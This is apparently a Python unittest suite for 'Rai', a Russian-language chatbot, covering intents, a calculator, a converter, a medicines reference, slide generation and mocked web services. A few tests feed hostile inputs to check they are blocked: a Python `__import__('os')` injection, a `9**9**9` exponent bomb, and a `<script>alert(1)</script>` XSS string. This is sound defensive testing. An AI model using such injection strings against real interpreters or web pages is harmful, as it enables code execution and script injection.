"""Тесты Rai: python -m unittest -v"""

import json
import os
import re
import tempfile
import unittest
import urllib.parse
from unittest import mock

# Тесты не зависят от больших данных, которые собирает GitHub (папка deep/)
os.environ["RAI_DEEP_DIR"] = os.path.join(tempfile.gettempdir(), "rai-tests-no-deep")
import app as rai_app  # noqa: E402
import nlp
import skills
from brain import Brain, RaiError
from versions import VERSIONS, resolve

PRO, FAST, PLUS, SUN = (VERSIONS[k] for k in ("pro", "pro-fast", "pro-plus", "pro-sun"))

import fake_net
import net

_real_fetch = net.fetch_text


def setUpModule():
    # Тесты не ходят в интернет: сервисы отвечают из fake_net.
    net.fetch_text = fake_net.fetch_text
    net._cache.clear()


def tearDownModule():
    net.fetch_text = _real_fetch


class VersionsTest(unittest.TestCase):
    def test_versions(self):
        self.assertEqual(list(VERSIONS), ["pro", "pro-fast", "pro-plus", "pro-sun", "pro-quasar"])
        quasar = VERSIONS["pro-quasar"]
        self.assertTrue(quasar.code and quasar.enrich and quasar.memory and quasar.multi)
        self.assertGreater(quasar.slide_limit, VERSIONS["pro-sun"].slide_limit)
        self.assertEqual(resolve("Quasar").id, "pro-quasar")
        self.assertEqual(resolve("sun").id, "pro-sun")

    def test_aliases(self):
        for raw, expected in [
            (None, "pro"), ("Pro", "pro"), ("Pro Fast", "pro-fast"),
            ("pro_plus", "pro-plus"), ("Rai Pro Sun", "pro-sun"), ("prosun", "pro-sun"),
        ]:
            self.assertEqual(resolve(raw).id, expected, raw)
        self.assertIsNone(resolve("ultra"))


class NlpTest(unittest.TestCase):
    def test_stem_merges_word_forms(self):
        self.assertEqual(nlp.stem("питоне"), nlp.stem("питон"))
        self.assertEqual(nlp.stem("циклы"), nlp.stem("цикл"))

    def test_spellchecker(self):
        sp = nlp.SpellChecker(["привет", "что такое python", "цикл"])
        self.assertEqual(sp.correct("ghbdtn"), "привет")
        self.assertEqual(sp.correct("что такое pyton"), "что такое python")
        self.assertEqual(sp.correct("цыкл"), "цикл")


class SkillsTest(unittest.TestCase):
    def test_calculator(self):
        self.assertEqual(skills.calculator("сколько будет 15*4+2"), "15*4+2 = 62")
        self.assertEqual(skills.calculator("2 плюс 2 умножить на 3"), "2 + 2 * 3 = 8")
        self.assertEqual(skills.calculator("корень из 144"), "√144 = 12")
        self.assertEqual(skills.calculator("20% от 350"), "20% от 350 = 70")
        self.assertEqual(skills.calculator("10/0"), "На ноль делить нельзя.")
        self.assertIsNone(skills.calculator("привет"))
        self.assertIsNone(skills.calculator("__import__('os')"))
        self.assertIsNone(skills.calculator("9**9**9"))

    def test_converter(self):
        self.assertEqual(skills.converter("1 км в м"), "1 км = **1 000** м")
        self.assertEqual(skills.converter("100 c в f"), "100 °C = **212** °F")
        self.assertEqual(skills.converter("1 кг в км"), "Эти единицы нельзя перевести друг в друга.")
        # время, данные, скорость, площадь; «сколько X в Y» в любом порядке слов; склонение и запятая
        self.assertEqual(skills.converter("сколько в часе секунд"), "1 ч = **3 600** с")
        self.assertEqual(skills.converter("сколько секунд в часе"), "1 ч = **3 600** с")
        self.assertEqual(skills.converter("сколько байт в килобайте"), "1 КБ = **1 024** байта")
        self.assertEqual(skills.converter("100 км/ч в м/с"), "100 км/ч = **27,7778** м/с")
        self.assertEqual(skills.converter("сколько соток в гектаре"), "1 га = **100** соток")
        self.assertEqual(skills.converter("переведи 100 км в мили"), "100 км = **62,1371** мили")
        self.assertEqual(skills.converter("2.5 мили в км"), "2,5 мили = **4,0234** км")

    def test_password(self):
        answer = skills.password("сгенерируй пароль 20")
        self.assertEqual(len(answer.rsplit(" ", 1)[1]), 20)

    def test_text_tools(self):
        self.assertEqual(skills.text_tools("переверни: абв"), "вба")
        self.assertTrue(skills.text_tools("сколько слов в: раз два три").startswith("Слов: 3"))

    def test_skill_sets_differ_by_version(self):
        self.assertIsNone(skills.run("сгенерируй пароль", FAST.skills))
        self.assertIsNotNone(skills.run("сгенерируй пароль", PLUS.skills))


class BrainTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def ask(self, version, text, sid="t"):
        return self.brain.answer(version, text, session_id=sid)

    def test_profile_name_from_account(self):
        # имя из аккаунта на сайте: Rai обращается по нему, пока человек сам не представится иначе
        import brain
        q = VERSIONS["pro-quasar"]
        brain.PROFILE.update({"name": "Аня"})
        try:
            self.assertIn("Аня", self.ask(q, "как меня зовут", sid="p1")["answer"])
            self.ask(q, "меня зовут Катя", sid="p2")
            self.assertIn("Катя", self.ask(q, "как меня зовут", sid="p2")["answer"])
        finally:
            brain.PROFILE.clear()
        self.assertNotIn("Аня", self.ask(q, "как меня зовут", sid="p3")["answer"])

    def test_no_false_topic_matches(self):
        # совпадение одного слова — ещё не ответ: «написал» ≠ «куда написать», «вечером» ≠ «добрый вечер»
        q = VERSIONS["pro-quasar"]
        for text, wrong in [("кто написал войну и мир", "contact"), ("что посмотреть вечером", "greeting"),
                            ("сколько дней до нового года", "how_are_you"), ("когда началась вторая мировая война", "debug"),
                            ("как сделать цикл в javascript", "python_loops")]:
            self.assertNotEqual(self.ask(q, text)["intent"], wrong, text)
        for text, right in [("доброе утро всем", "greeting"), ("спасибо большое", "thanks"), ("как дела сегодня", "how_are_you"),
                            ("ок понятно спасибо", "ok"), ("как попасть в команду", "join_team")]:
            self.assertEqual(self.ask(q, text)["intent"], right, text)
        # исправление опечаток не трогает обычные слова и всегда одинаково
        self.assertEqual(self.brain.speller.correct("доброе утро всем"), "доброе утро всем")
        self.assertEqual(self.brain.speller.correct("превет"), "привет")

    def test_syntax_examples(self):
        import syntax
        q = VERSIONS["pro-quasar"]
        for text, head in [("как сделать цикл в javascript", "Циклы на JavaScript"), ("как написать функцию на c++", "Функции на C++"),
                           ("словарь в go", "Словари (ключ → значение) на Go"), ("как сделать класс в php", "Классы и объекты на PHP"),
                           ("ввод с клавиатуры на java", "Ввод с клавиатуры на Java")]:
            r = self.ask(q, text)
            self.assertEqual(r["intent"], "proglang", text)
            self.assertIn(head, r["answer"])
        # конкретная задача — это уже программа, а не справка о синтаксисе
        self.assertEqual(self.ask(q, "напиши функцию на python которая считает факториал")["intent"], "code")
        self.assertEqual(len([1 for t in syntax.S.values() for _ in t]), 114)

    def test_poems_recommendations_support(self):
        q = VERSIONS["pro-quasar"]
        r = self.ask(q, "придумай стих про осень")
        self.assertEqual(r["intent"], "poem")
        self.assertIn("Сочинил Rai", r["answer"])
        self.assertIn("Пушкин", self.ask(q, "прочитай стих пушкина")["answer"])
        self.assertIn("Rai Нейро", self.ask(q, "стих про трактор")["answer"])
        for text in ("посоветуй фильм", "что посмотреть вечером", "посоветуй комедию", "посоветуй книгу фантастика",
                     "во что поиграть", "посоветуй сериал"):
            self.assertEqual(self.ask(q, text)["intent"], "recommend", text)
        self.assertIn("Фильмы: комедия", self.ask(q, "посоветуй комедию")["answer"])
        for text in ("мне грустно", "я устал", "мне скучно", "не могу уснуть", "завтра экзамен, волнуюсь"):
            self.assertEqual(self.ask(q, text)["intent"], "support", text)
        crisis = self.ask(q, "я не хочу жить")
        self.assertEqual(crisis["intent"], "crisis")
        self.assertIn("8-800-2000-122", crisis["answer"])
        # игру по-прежнему делает генератор кода
        self.assertEqual(self.ask(q, "сделай игру змейка")["intent"], "code")

    def test_dates_and_units(self):
        q = VERSIONS["pro-quasar"]
        with mock.patch("skills._now", return_value=__import__("datetime").datetime(2026, 10, 3, 12, 0)):
            self.assertIn("**90 дней**", self.ask(q, "сколько дней до нового года")["answer"])
            self.assertIn("**156 дней**", self.ask(q, "сколько дней до 8 марта")["answer"])
            self.assertIn("**81 год**", self.ask(q, "сколько лет прошло с 1945 года")["answer"])
            self.assertIn("**пятница**", self.ask(q, "какой день недели будет 1 января 2027")["answer"])
            self.assertIn("была **среда**", self.ask(q, "какой день недели был 9 мая 1945")["answer"])
            self.assertIn("13 октября 2026", self.ask(q, "какое число будет через 10 дней")["answer"])
            self.assertIn("високосный", self.ask(q, "високосный ли 2028 год")["answer"])
        r = self.ask(q, "переведи 100 км в мили")
        self.assertEqual((r["intent"], r["answer"]), ("skill", "100 км = **62,1371** мили"))

    def test_knowledge_in_all_versions(self):
        for v in VERSIONS.values():
            self.assertEqual(self.ask(v, "привет")["intent"], "greeting", v.id)
            self.assertEqual(self.ask(v, "что такое питон?")["intent"], "python", v.id)
            self.assertEqual(self.ask(v, "что такое джаваскрипт")["intent"], "javascript", v.id)

    def test_generic_words_do_not_match(self):
        for v in VERSIONS.values():
            self.assertIsNone(self.ask(v, "что такое рхп")["intent"], v.id)

    def test_layout_and_typos_in_every_version(self):
        for v in VERSIONS.values():  # неверную раскладку и опечатки понимают все версии
            self.assertEqual(self.ask(v, "ghbdtn")["intent"], "greeting", v.id)
            self.assertEqual(self.ask(v, "раскажи анекдот")["intent"], "joke", v.id)
        self.assertEqual(self.ask(SUN, "что такое pyton")["intent"], "python")

    def test_name_memory(self):
        self.ask(PLUS, "меня зовут артём", "a")
        self.assertEqual(self.ask(PLUS, "как меня зовут", "a")["answer"], "Вас зовут Артём.")
        self.assertIn("Артём", self.ask(PLUS, "спасибо", "a")["answer"])
        # Другая сессия имя не знает.
        self.assertNotIn("Артём", self.ask(PLUS, "как меня зовут", "b")["answer"])
        # Pro имя не запоминает.
        self.assertIn("Pro Plus", self.ask(PRO, "как меня зовут", "a")["answer"])

    def test_name_from_history_without_session(self):
        history = [{"role": "user", "content": "Меня зовут Ира"}, {"role": "assistant", "content": "Ок"}]
        r = self.brain.answer(PLUS, "как меня зовут", history=history)
        self.assertEqual(r["answer"], "Вас зовут Ира.")

    def test_more(self):
        self.ask(PLUS, "кто ты", "m")
        self.assertEqual(self.ask(PLUS, "подробнее", "m")["answer"], self.brain.intents["who_are_you"]["more"])
        first = self.ask(PLUS, "расскажи шутку", "m")["answer"]
        self.assertNotEqual(self.ask(PLUS, "ещё", "m")["answer"], first)

    def test_sun_memory_and_multi(self):
        self.assertIn("только Rai Pro Sun", self.ask(PLUS, "запомни, что я люблю чай")["answer"])
        self.ask(SUN, "запомни, что мой любимый цвет красный", "s")
        self.assertIn("красный", self.ask(SUN, "какой мой любимый цвет", "s")["answer"])
        self.assertIn("красный", self.ask(SUN, "что ты помнишь", "s")["answer"])
        self.ask(SUN, "забудь всё", "s")
        self.assertIn("ничего", self.ask(SUN, "что ты помнишь", "s")["answer"])
        self.assertEqual(self.ask(SUN, "что такое html? а css?")["intent"], ["html", "css"])

    def test_sun_is_detailed(self):
        more = self.brain.intents["python"]["more"]
        self.assertIn(more, self.ask(SUN, "что такое python")["answer"])
        self.assertNotIn(more, self.ask(PRO, "что такое python")["answer"])

    def test_suggestions(self):
        r = self.ask(PLUS, "расскажи про php сервер")
        self.assertTrue(r["intent"] or "Возможно" in r["answer"])

    def test_teach(self):
        self.brain.teach(["когда созвон команды"], "Созвон по пятницам в 19:00.")
        self.assertEqual(self.ask(PRO, "когда созвон?")["answer"], "Созвон по пятницам в 19:00.")
        with open(self.brain.learned_path, encoding="utf-8") as f:
            self.assertEqual(len(json.load(f)["intents"]), 1)
        with self.assertRaises(RaiError):
            self.brain.teach([], "x")

    def test_validation(self):
        with self.assertRaises(RaiError):
            self.ask(PRO, "   ")
        with self.assertRaises(RaiError):
            self.ask(PRO, "а" * 10000)


class MedsTest(unittest.TestCase):
    """Лекарства: справочник, страна, аналоги, сочетания, безопасность, большая база из Wikidata."""

    def test_find_names_in_any_form(self):
        import meds
        self.assertEqual(meds.find("аналог нурофена"), ["ibuprofen"])
        self.assertEqual(meds.find("смекты нет"), ["smectite"])
        self.assertEqual(meds.find("АЦЦ от кашля"), ["acetylcysteine"])
        self.assertEqual(meds.find("Tylenol"), ["paracetamol"])
        for text in ("кандидат наук", "сбросить пароли", "iron man", "каменный уголь"):
            self.assertEqual(meds.find(text), [], text)

    def test_symptom_by_region(self):
        import meds
        tr = meds.answer("что выпить от головной боли в Турции")
        self.assertIn("Parol", tr)
        self.assertIn("112", tr)
        self.assertIn("справка, а не назначение", tr)
        us = meds.answer("что принять от температуры", "us")
        self.assertIn("Tylenol", us)
        self.assertIn("911", us)
        by = meds.answer("болит горло что принять", "by")
        self.assertIn("Стрепсилс", by)
        self.assertIn("в Беларуси", by)
        self.assertIsNone(meds.answer("болит голова от твоих шуток"))   # без вопроса о лекарствах — не справочник

    def test_card_analogs_compare_together(self):
        import meds
        card = meds.answer("как называется нурофен в США")
        self.assertIn("Advil", card.split("\n\n**Как называется")[1].split("\n")[1])   # своя страна — первой строкой
        self.assertIn("Ibuprofen", card)
        self.assertIn("Нурофен", meds.answer("аналог ибупрофена", "ru"))
        self.assertIn("⚖️", meds.answer("что лучше нурофен или парацетамол"))
        both = meds.answer("можно ли нурофен и аспирин вместе")
        self.assertIn("два НПВП", both)
        self.assertIn("тяжёлая реакция", meds.answer("метронидазол с алкоголем"))
        self.assertIn("4 г в сутки", meds.answer("сколько можно выпить парацетамола"))
        self.assertIn("не доказана", meds.answer("что такое арбидол"))

    def test_safety(self):
        import meds
        self.assertIn("не подскажу", meds.answer("трамадол без рецепта где купить"))
        self.assertIn("не подскажу", meds.answer("купить феназепам без рецепта"))
        self.assertIn("только по рецепту", meds.answer("где купить амлодипин без рецепта"))
        self.assertIn("8-800-2000-122", meds.answer("сколько таблеток парацетамола смертельно"))
        self.assertIsNone(meds.answer("кто изобрел аспирин"))   # история — к энциклопедии

    def test_large_base(self):
        import meds
        try:
            meds.load({"items": [{"n": "трамадол", "en": "tramadol", "d": "опиоидный анальгетик", "atc": ["N02AX02"], "brands": ["Трамал"]},
                                 {"n": "кислород", "en": "oxygen", "d": "химический элемент", "atc": ["V03AN01"]},
                                 {"n": "ацетилсалициловая кислота", "en": "aspirin", "atc": ["N02BA01"], "rx": {"Германия": "рецептурный"}}]})
            self.assertEqual(meds.db_find("ацетилсалициловую кислоту")["en"], "aspirin")
            self.assertIn("tramadol", meds.answer("что такое трамадол"))
            self.assertIn("tramadol", meds.answer("трамал инструкция"))
            self.assertIsNone(meds.answer("что такое кислород"))
        finally:
            meds.load({})

    def test_real_base_from_github(self):
        import meds
        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "medicines.json")
        if not os.path.exists(path):
            self.skipTest("medicines.json ещё не собран")
        with open(path, encoding="utf-8") as fh:
            self.assertGreater(meds.load(json.load(fh)), 1000)
        try:
            self.assertIn("tramadol", meds.answer("что такое трамадол"))
            self.assertIn("Амитриптилин", meds.answer("что такое амитриптилин"))
            self.assertIsNone(meds.answer("что такое кислород"))
            self.assertIn("не подскажу", meds.answer("где купить трамадол"))
        finally:
            meds.load({})

    def test_builder_parses_wikidata(self):
        import sys
        sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "tools"))
        import build_medicines as bm

        def fake(url, params=None, tries=5):
            if url == bm.SPARQL:
                return {"results": {"bindings": [{"item": {"value": "http://www.wikidata.org/entity/Q1"}, "atc": {"value": "N02BE01"}}]}}
            if url == bm.WD:
                if params["props"] == "labels":
                    return {"entities": {"Q9": {"labels": {"ru": {"value": "лихорадка"}}}}}
                return {"entities": {"Q1": {"labels": {"ru": {"value": "парацетамол"}, "en": {"value": "paracetamol"}},
                                            "sitelinks": {"ruwiki": {"title": "Парацетамол"}},
                                            "claims": {"P2175": [{"mainsnak": {"datavalue": {"value": {"id": "Q9"}}}}]}}}}
            return {"query": {"pages": {"1": {"title": "Парацетамол", "extract": "Парацетамол (лат. Paracetamolum) — анальгетик."}}}}
        old = bm.fetch_json
        bm.fetch_json = fake
        try:
            item = bm.build()["items"][0]
        finally:
            bm.fetch_json = old
        self.assertEqual((item["n"], item["for"], item["atc"]), ("парацетамол", ["лихорадка"], ["N02BE01"]))
        self.assertEqual(item["x"], "Парацетамол — анальгетик.")

    def test_engine_routes_medicine_questions(self):
        import brain
        b = Brain(learned_path=os.path.join(tempfile.mkdtemp(), "l.json"))
        brain.PROFILE.update({"region": "us"})
        try:
            r = b.answer(VERSIONS["pro-quasar"], "что выпить от головной боли", session_id="med")
            self.assertEqual(r["intent"], "meds")
            self.assertIn("Tylenol", r["answer"])
            self.assertNotEqual(b.answer(VERSIONS["pro-quasar"], "напиши программу учёта лекарств на python", session_id="med")["intent"], "meds")
        finally:
            brain.PROFILE.clear()


class CreativeTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))

    def tearDown(self):
        self.tmp.cleanup()

    def test_image(self):
        r = self.brain.answer(PRO, "нарисуй закат над морем")
        image = r["attachments"][0]
        self.assertEqual(image["type"], "image")
        self.assertTrue(image["svg"].startswith("<svg"))
        self.assertIn("Закат", image["title"])
        self.assertIn("не умею", self.brain.answer(PRO, "нарисуй кота")["answer"])
        self.assertEqual(self.brain.answer(FAST, "нарисуй закат")["attachments"], [])

    def test_logo_text_is_escaped(self):
        import creative
        svg = creative.make_image('логотип <script>alert(1)</script>')["svg"]
        self.assertNotIn("<script", svg)

    def test_slides(self):
        self.assertEqual(self.brain.answer(PRO, "сделай презентацию про python")["attachments"], [])
        deck = self.brain.answer(SUN, "сделай презентацию про python")["attachments"][0]
        kinds = [s["kind"] for s in deck["slides"]]
        self.assertEqual((kinds[0], kinds[-1]), ("title", "end"))
        self.assertIn("code", kinds)
        self.assertTrue(deck["slides"][0].get("image"))
        self.assertTrue(all(s.get("transition") for s in deck["slides"]))
        glossary_deck = self.brain.answer(PLUS, "презентация про космос")["attachments"][0]
        self.assertGreaterEqual(len(glossary_deck["slides"]), 4)
        # никаких «замените этот текст» — только настоящий материал
        all_text = json.dumps(glossary_deck, ensure_ascii=False)
        self.assertNotIn("Замените", all_text)
        self.assertNotIn("ваш текст", all_text)
        # нет материала — нет пустой презентации
        r = self.brain.answer(PLUS, "презентация про абвгдейка")
        self.assertEqual(r["attachments"], [])
        self.assertIn("не нашёл материала", r["answer"])

    def test_slide_colors(self):
        import creative
        deck = self.brain.answer(SUN, "сделай презентацию про python в фиолетовых тонах")["attachments"][0]
        self.assertEqual(deck["title"], "Python")
        self.assertEqual(deck["theme"]["accent"], "#7c3aed")
        th = creative.deck_theme("презентация про море, фон белый, акцент зелёный")
        self.assertEqual((th["bg"], th["accent"]), ("#ffffff", "#16a34a"))
        th = creative.deck_theme("чёрно-золотая презентация")
        self.assertEqual((th["bg"], th["accent"]), ("#0b0b0c", "#d4af37"))
        th = creative.deck_theme("в тёмно-синих и оранжевых цветах")
        self.assertEqual((th["bg"], th["accent"]), ("#0b1f4d", "#f97316"))
        self.assertEqual(creative.deck_theme("презентация про #ff00aa кошек")["accent"], "#ff00aa")
        self.assertEqual(creative.slides_topic("презентация про космос в синих тонах"), "космос")
        # картинки рисуются в цветах темы
        self.assertIn("#7c3aed", deck["slides"][0]["image"])

    def test_slide_kinds(self):
        import creative
        # годы -> хронология, крупные числа -> «цифры»
        tl = creative._as_timeline(["В 1991 году вышел Python 0.9", "2000 — Python 2.0", "**2008** — вышел Python 3"])
        self.assertEqual([x["date"] for x in tl], ["1991", "2000", "2008"])
        self.assertEqual(tl[0]["text"], "Вышел Python 0.9")
        st = creative._as_stats(["Население — около 146 млн человек", "Более 190 народов", "85% жителей — горожане"])
        self.assertEqual([x["value"] for x in st], ["≈ 146 млн", "190+", "85%"])
        self.assertIsNone(creative._as_stats(["Python прост", "Много библиотек", "Популярен"]))
        self.assertIsNone(creative._as_timeline(["Первый пункт", "Второй", "Третий"]))
        article = {"title": "Космонавтика", "answers": ["История полётов в космос.\n\n- 1957 — первый спутник\n"
                                                         "- 1961 — полёт Гагарина\n- 1969 — высадка на Луну"]}
        deck = creative.make_slides("космонавтика", [article, {"title": "Ракета", "answers": ["Ракета летит за счёт реактивной тяги двигателя."]}])
        self.assertIn("timeline", [s["kind"] for s in deck["slides"]])
        # один пункт не превращается в список из одного пункта
        self.assertNotIn(1, [len(s["bullets"]) for s in deck["slides"] if s["kind"] == "bullets"])
        # название — в именительном падеже
        self.assertEqual(creative.nominative("историю древнего рима"), "история древнего рима")
        self.assertEqual(creative.nominative("солнечную систему"), "солнечная система")
        self.assertEqual(creative.nominative("кенгуру"), "кенгуру")
        self.assertEqual(self.brain.answer(SUN, "сделай презентацию про историю python")["attachments"][0]["title"][:7], "История")

    def test_archive(self):
        r = self.brain.answer(PRO, "сделай архив")
        self.assertEqual(r["attachments"][0]["type"], "archive")
        # «Как сделать презентацию?» — вопрос, а не просьба.
        self.assertEqual(self.brain.answer(PLUS, "как сделать презентацию")["attachments"], [])

    def test_glossary_capitals_tables(self):
        self.assertEqual(self.brain.answer(PRO, "что такое фотосинтез")["intent"], "glossary")
        self.assertEqual(self.brain.answer(PLUS, "что такое фатосинтез")["intent"], "glossary")
        self.assertEqual(self.brain.answer(PRO, "что такое сервер")["intent"], "glossary")
        self.assertIn("Париж", self.brain.answer(PRO, "столица франции")["answer"])
        self.assertIn("Сеул", self.brain.answer(PRO, "какая столица южной кореи?")["answer"])
        self.assertIn("| 7 × 3 | **21** |", self.brain.answer(PRO, "таблица умножения на 7")["answer"])
        unknown = self.brain.answer(SUN, "что такое флюмбрикс")["answer"]
        self.assertIn("запомни, что флюмбрикс", unknown)


class OnlineTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.brain = Brain(learned_path=os.path.join(self.tmp.name, "learned.json"))
        net._cache.clear()

    def tearDown(self):
        self.tmp.cleanup()

    def ask(self, text, version=None, sid="o"):
        return self.brain.answer(version or PLUS, text, session_id=sid)

    def test_weather_with_picture_and_city_memory(self):
        r = self.ask("какая погода в Казани?")
        self.assertEqual(r["intent"], "weather")
        self.assertIn("Казань", r["answer"])
        self.assertIn("| завтра |", r["answer"])
        self.assertEqual(r["attachments"][0]["type"], "image")
        self.assertIn("+12°", r["attachments"][0]["svg"])
        self.assertIn("Казань", self.ask("а погода?")["answer"])      # город запомнился
        self.assertIn("Москва", self.ask("погода в москве")["answer"])  # «москве» -> Москва

    def test_web_presentation(self):
        import creative
        req = creative.parse_deck_request("презентация про историю России на 10 слайдов, разделы: Древняя Русь, империя и СССР, с таблицей")
        self.assertEqual((req["topic"], req["count"], req["sections"]), ("историю России", 10, ["Древняя Русь", "империя", "СССР"]))
        self.assertEqual(req["want"], {"table"})
        self.assertEqual(creative.parse_deck_request("про python без картинок")["pictures"], "none")
        self.assertEqual(creative.parse_deck_request("презентация сравни кошек и собак")["compare"], ["кошек", "собак"])

        r = self.ask("подготовь презентацию о Солнечной системе на 12 слайдов с таблицей и цитатой, обязательно про Марс", SUN)
        deck = r["attachments"][0]
        kinds = [s["kind"] for s in deck["slides"]]
        self.assertEqual(deck["title"], "Солнечная система")
        self.assertEqual(len(kinds), 12)
        for kind in ("table", "quote", "agenda"):
            self.assertIn(kind, kinds)
        self.assertIn("Марс", [s["title"] for s in deck["slides"]])                        # заказанный раздел
        self.assertEqual(deck["slides"][0]["pic"], "https://upload.wikimedia.org/solar.jpg")  # фото из интернета
        self.assertNotIn("https://upload.wikimedia.org/flag.png", json.dumps(deck))          # флаги и значки не берём
        quote = next(s for s in deck["slides"] if s["kind"] == "quote")
        self.assertEqual(quote["author"], "Константин Циолковский")
        self.assertIn("Википедии", r["answer"])
        # в плане — только то, что есть на слайдах
        agenda = next(s for s in deck["slides"] if s["kind"] == "agenda")
        titles = {s.get("title") for s in deck["slides"]}
        self.assertTrue(all(t in titles for t in agenda["items"]))
        # просили цифры и хронологию — они есть; без картинок — ни фото, ни рисунков
        deck = self.ask("презентация про солнечную систему без картинок на 7 слайдов с цифрами и хронологией", SUN)["attachments"][0]
        kinds = [s["kind"] for s in deck["slides"]]
        self.assertIn("stats", kinds)
        self.assertIn("timeline", kinds)
        self.assertFalse(any(s.get("pic") or s.get("image") for s in deck["slides"]))
        # сравнение
        deck = self.ask("презентация сравни кошек и собак", SUN)["attachments"][0]
        cmp = next(s for s in deck["slides"] if s["kind"] == "compare")
        self.assertEqual((cmp["left"]["title"], cmp["right"]["title"]), ("Кошка", "Собака"))

    def test_web_search_through_hosting(self):
        # без посредника на хостинге — только Википедия; с ним — ищет в интернете (Google / DuckDuckGo)
        self.assertNotIn("example.ru", self.ask("изобретение радио", SUN)["answer"])
        net.PROXY = "https://rai.test/net.php"
        try:
            r = self.ask("изобретение радио", SUN)
        finally:
            net.PROXY = ""
        self.assertEqual(r["intent"], "web")
        # на «кто изобрёл радио» Rai отвечает сам — из своего справочника, без интернета
        own = self.ask("кто изобрёл радио", SUN)
        self.assertEqual(own["intent"], "tool")
        self.assertIn("Попов", own["answer"])
        self.assertIn("Попов", r["answer"])
        self.assertIn("(https://example.ru/radio)", r["answer"])
        self.assertTrue(any("net.php?search=" in c for c in fake_net.calls))

    def test_currency(self):
        self.assertIn("**100 USD = 9 250 RUB**", self.ask("100 долларов в рублях")["answer"])
        self.assertIn("1 USD = 92,5 RUB", self.ask("курс доллара")["answer"])
        self.assertIn("50 BYN", self.ask("50 белорусских рублей в рублях")["answer"])
        self.assertIn("| евро | EUR |", self.ask("курсы валют")["answer"])
        # «сумма», «Лариса», «1 фунт в кг» — не валюты
        self.assertNotEqual(self.ask("какая сумма у Ларисы")["intent"], "currency")
        self.assertEqual(self.ask("1 фунт в кг")["intent"], "skill")

    def test_translate(self):
        import online
        self.assertEqual(online.detect_language("Guten Morgen, wie geht es dir?"), "de")
        self.assertEqual(online.detect_language("¿Cómo estás?"), "es")
        self.assertEqual(online.detect_language("Привіт, як справи?"), "uk")
        self.assertEqual(online.detect_language("こんにちは"), "ja")
        self.assertEqual(online.parse_translate("переведи на английский: доброе утро"), ("доброе утро", None, "en"))
        self.assertEqual(online.parse_translate("как по-немецки кошка"), ("кошка", None, "de"))
        r = self.ask("переведи с английского на французский: good morning")
        self.assertIn("[en|fr] good morning", r["answer"])
        self.assertIn("[de|ru]", self.ask("переведи Guten Morgen")["answer"])

    def test_web_search(self):
        r = self.ask("найди в интернете эйфелева башня")
        self.assertEqual(r["intent"], "web")
        self.assertIn("Парижа", r["answer"])
        self.assertEqual(r["attachments"][0]["type"], "photo")
        # неизвестное — Rai сам идёт искать (энциклопедии нет); знакомое по энциклопедии — отвечает сам, без интернета
        import encyclopedia
        with mock.patch.object(encyclopedia, "_data", None):
            self.assertEqual(self.ask("что такое эйфелева башня")["intent"], "web")
        if encyclopedia.lookup("Эйфелева башня"):
            self.assertEqual(self.ask("что такое эйфелева башня")["intent"], "encyclopedia")
        self.assertIn("умеют Rai Pro", self.ask("найди в интернете эйфелева башня", FAST)["answer"])

    def test_no_internet(self):
        def down(*a, **k):
            raise net.NetError("NetworkError: Failed to execute 'send' on 'XMLHttpRequest'", offline=True)
        with mock.patch.object(net, "fetch_text", down):
            r = self.ask("погода в Казани")
            self.assertIn("нет связи", r["answer"])
            self.assertNotIn("XMLHttpRequest", r["answer"])  # без технических подробностей
            self.assertTrue(r["offline"])                     # страница может отдать вопрос нейросети
            self.assertIn("net.php", r["answer"])             # подсказка: посредник на хостинге
            self.assertIn("нет связи", self.ask("курс доллара")["answer"])
            self.assertIn("не получилось перевести", self.ask("переведи на английский: доброе утро")["answer"].lower())
            answer = self.ask("что такое флюмбрикс", SUN)["answer"]
            self.assertIn("запомни, что флюмбрикс", answer)
            self.assertIn("не получилось", answer)
            # окно просмотра, где интернет закрыт: сразу объясняем, куда идти
            with mock.patch.object(net, "SANDBOX", True):
                self.assertIn("rai.rteam.info", self.ask("погода в Минске")["answer"])
                self.assertIn("rai.rteam.info", self.ask("https://www.tiktok.com/@user/video/1", SUN)["answer"])
        self.assertFalse(self.ask("привет")["offline"])

    def test_weather_any_place(self):
        # город без предлога, в любом порядке, с деревнями и районами
        for q, where in (("погода минск", "Минск, Беларусь"), ("Минск погода", "Минск, Беларусь"),
                         ("температура гомель завтра", "Гомель, Беларусь"),
                         ("погода в деревне Малиновка Минского района", "Малиновка, Минская область, Беларусь"),
                         ("погода в Ждановичах", "Ждановичи, Минская область, Беларусь"),
                         ("погода в посёлке Энергетиков Бобруйск", "Энергетиков, Могилёвская область, Беларусь")):
            self.assertIn("## Погода: " + where, self.ask(q, sid="p" + q)["answer"], q)
        # одноимённые сёла: говорим, какое показали, и как уточнить
        answer = self.ask("погода Малиновка", sid="amb")["answer"]
        self.assertIn("несколько", answer)
        self.assertIn("Минская область", answer)
        # после «погода минск» — сначала Беларусь; «а в …?» — продолжение
        self.ask("погода минск", sid="home")
        self.assertIn("Малиновка, Минская область", self.ask("а в Малиновке?", sid="home")["answer"])
        # место не указано — честно говорим, для какого города погода
        self.assertIn("Место не указано", self.ask("какая погода сегодня", sid="none")["answer"])

    def test_memes(self):
        import memes
        self.assertIn("Маргрит ван Бревоорт", self.ask("что за мем ждун", SUN)["answer"])
        self.assertEqual(self.ask("откуда мем шлепа", SUN)["intent"], "meme")
        self.assertIn("Скуф", self.ask("что значит скуф", SUN)["answer"])
        self.assertIn("Мемы 2025 года", self.ask("мемы 2025", SUN)["answer"])
        self.assertNotEqual(self.ask("что такое сигма", SUN)["intent"], "meme")   # без слова «мем» — не мем
        self.assertEqual(self.ask("что за мем сигма", SUN)["intent"], "meme")
        self.assertEqual(memes.topic("что за мем бобр курва"), "бобр курва мем")    # нет в базе — ищем в интернете
        self.assertGreaterEqual(len(memes.MEMES), 50)

    def test_cities_offline(self):
        import cities
        for phrase, name in (("Минске", "Минск"), ("Нижнем Новгороде", "Нижний Новгород"), ("Ростове-на-Дону", "Ростов-на-Дону"),
                             ("Питере", "Санкт-Петербург"), ("Уфе", "Уфа"), ("Перми", "Пермь"), ("Орле", "Орёл"), ("Бресте", "Брест")):
            self.assertEqual(cities.find(phrase)["name"], name, phrase)
